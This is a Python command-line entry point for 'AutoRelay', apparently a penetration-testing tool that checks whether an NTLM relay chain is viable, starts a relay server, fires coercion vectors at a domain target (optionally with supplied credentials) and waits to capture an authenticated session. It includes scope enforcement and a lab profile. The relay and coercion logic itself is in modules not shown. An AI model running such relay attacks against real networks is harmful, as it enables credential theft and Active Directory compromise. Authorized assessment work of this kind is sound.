"""
AutoRelay — CLI entry point.
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

from config import ConfigError, ScopeViolation, build_profile_from_args
from preflight import run as run_preflight
from util import log as log_setup
from util.net import parse_targets
from relay.server import RelayServer
from coercion import dispatcher

from report.findings import build_document
from report.markdown import render_markdown
from report.html import render_html

EXIT_OK = 0
EXIT_CONFIG_ERROR = 2
EXIT_SCOPE_VIOLATION = 3
EXIT_BLOCKERS = 4
EXIT_UNEXPECTED = 5

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="autorelay",
        description="Authorized Active Directory assessment tool.",
    )
    parser.add_argument("--profile", default=None, help="Configuration profile: 'goad' (default) or 'live'")
    parser.add_argument("--scope", default=None, help="Path to scope file (required for 'live' profile)")
    parser.add_argument("--yes", action="store_true", help="Non-interactive (rejected in 'live' profile)")
    parser.add_argument("--debug", action="store_true", help="Force DEBUG logging regardless of profile")

    subparsers = parser.add_subparsers(dest="command", required=True)

    # --- preflight ---
    pf = subparsers.add_parser("preflight", help="Check whether an NTLM relay chain is viable")
    pf.add_argument("--target", required=True)
    pf.add_argument("--relay-targets", required=True)
    pf.add_argument("--report", default=None)
    pf.add_argument("--html", default=None)
    pf.add_argument("--json", default=None)
    pf.add_argument("--quiet", action="store_true")

    # --- run ---
    run = subparsers.add_parser("run", help="Run preflight, start relay, and fire coercion")
    run.add_argument("--target", required=True)
    run.add_argument("--relay-targets", required=True)
    run.add_argument("--listener-ip", required=True)
    run.add_argument("--timeout", type=int, default=30)
    run.add_argument("--no-coerce", action="store_true", help="Skip the coercion trigger")
    
    # NEW: Credentials for authenticated coercion
    run.add_argument("--username", default="", help="Username for authenticated coercion")
    run.add_argument("--password", default="", help="Password for authenticated coercion")
    run.add_argument("--domain", default="", help="Domain for authenticated coercion")

    return parser

def cmd_preflight(args: argparse.Namespace, profile) -> int:
    try:
        relay_targets = parse_targets(args.relay_targets)
    except ValueError as e:
        print(f"error: {e}", file=sys.stderr)
        return EXIT_CONFIG_ERROR

    if not relay_targets:
        print("error: --relay-targets must not be empty", file=sys.stderr)
        return EXIT_CONFIG_ERROR

    target = args.target.strip()
    if not target:
        print("error: --target must not be empty", file=sys.stderr)
        return EXIT_CONFIG_ERROR

    log = log_setup.get_logger("autorelay.cli")
    log.info(f"command=preflight profile={profile.name} target={target} relay_targets={relay_targets}")

    if profile.safety.hard_scope_enforcement:
        from config import enforce_scope
        try:
            enforce_scope(profile, target, "preflight")
            for rt in relay_targets:
                enforce_scope(profile, rt, "preflight")
        except ScopeViolation as e:
            print(f"error: {e}", file=sys.stderr)
            return EXIT_SCOPE_VIOLATION

    try:
        report = run_preflight(
            target=target,
            relay_targets=relay_targets,
            profile_name=profile.name,
            timeout_override={
                "tcp": profile.timeouts.tcp_connect,
                "smb": profile.timeouts.smb_negotiate,
                "ldap": profile.timeouts.ldap_bind,
                "rpc": profile.timeouts.rpc_bind,
            },
        )
    except Exception as e:
        log.exception("preflight crashed")
        print(f"error: preflight failed: {e}", file=sys.stderr)
        return EXIT_UNEXPECTED

    if not args.quiet:
        print(report.render_console(color=profile.output.color))

    doc = None
    if args.report or args.html:
        doc = build_document(report)

    if args.report:
        path = Path(args.report)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(render_markdown(doc), encoding="utf-8")
        if not args.quiet:
            print(f"\nMarkdown report: {path}")

    if args.html:
        path = Path(args.html)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(render_html(doc), encoding="utf-8")
        if not args.quiet:
            print(f"HTML report:     {path}")

    if args.json:
        path = Path(args.json)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(report.to_json(), encoding="utf-8")
        if not args.quiet:
            print(f"JSON report:     {path}")

    if not report.ok_to_proceed():
        if not args.quiet:
            print(f"\n{len(report.blockers)} blocker(s) found — chain not viable as-is", file=sys.stderr)
        return EXIT_BLOCKERS

    return EXIT_OK


def cmd_run(args: argparse.Namespace, profile) -> int:
    log = log_setup.get_logger("autorelay.cli")
    
    try:
        relay_targets = parse_targets(args.relay_targets)
    except ValueError as e:
        print(f"error: {e}", file=sys.stderr)
        return EXIT_CONFIG_ERROR

    target = args.target.strip()
    
    if profile.safety.hard_scope_enforcement:
        from config import enforce_scope
        try:
            enforce_scope(profile, target, "coercion")
            for rt in relay_targets:
                enforce_scope(profile, rt, "relay")
        except ScopeViolation as e:
            print(f"error: {e}", file=sys.stderr)
            return EXIT_SCOPE_VIOLATION

    log.info(f"command=run profile={profile.name} target={target} relay_targets={relay_targets}")
    
    print(f"\n--- [1/4] Running Preflight ---")
    report = run_preflight(
        target=target,
        relay_targets=relay_targets,
        profile_name=profile.name,
        timeout_override={
            "tcp": profile.timeouts.tcp_connect,
            "smb": profile.timeouts.smb_negotiate,
            "ldap": profile.timeouts.ldap_bind,
            "rpc": profile.timeouts.rpc_bind,
        },
    )
    print(report.render_console(color=profile.output.color))

    if not report.ok_to_proceed():
        print("\nPreflight failed. Blockers found. Aborting run.", file=sys.stderr)
        return EXIT_BLOCKERS

    print(f"\n--- [2/4] Starting Relay Server ---")
    server = RelayServer(relay_targets=relay_targets, listener_ip=args.listener_ip)

    session = None
    try:
        server.start()
        time.sleep(2) 

        print(f"\n--- [3/4] Coercion ---")
        if args.no_coerce:
            print("Skipping coercion (--no-coerce). Waiting for external connection...")
        else:
            print(f"Firing coercion vectors at {target}...")
            # Pass credentials to the dispatcher
            success = dispatcher.trigger_any(
                target, 
                args.listener_ip, 
                username=args.username, 
                password=args.password, 
                domain=args.domain
            )
            if success:
                print("Coercion trigger sequence sent. Waiting for session...")
            else:
                print("All coercion vectors failed. Check logs.")

        print(f"\n--- [4/4] Waiting ---")
        print(f"Waiting up to {args.timeout} seconds for a connection...")
        session = server.wait_for_session(timeout=args.timeout)
        
        if session:
            print(f"\n[+] SUCCESS! Captured session: {session.identity} -> {session.protocol}://{session.target}")
        else:
            print(f"\n[-] No session captured within {args.timeout} seconds.")

    except KeyboardInterrupt:
        print("\nInterrupted by user.")
    except Exception as e:
        log.exception("Run failed")
        print(f"error: {e}", file=sys.stderr)
        return EXIT_UNEXPECTED
    finally:
        server.stop()
        print("\nRelay server stopped. Run complete.")

    return EXIT_OK

def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    try:
        profile = build_profile_from_args(args)
    except ConfigError as e:
        print(f"config error: {e}", file=sys.stderr)
        return EXIT_CONFIG_ERROR

    level = "DEBUG" if args.debug else profile.logging.level
    log_setup.setup(
        log_dir=profile.logging.log_dir,
        level=level,
        console=profile.logging.console,
        file=profile.logging.file,
        color=profile.output.color,
    )
    log = log_setup.get_logger("autorelay.cli")
    log.info(f"profile={profile.name} mode={profile.mode}")

    if args.command == "preflight":
        return cmd_preflight(args, profile)
    elif args.command == "run":
        return cmd_run(args, profile)

    parser.error(f"unknown command: {args.command}")
    return EXIT_UNEXPECTED

if __name__ == "__main__":
    sys.exit(main())
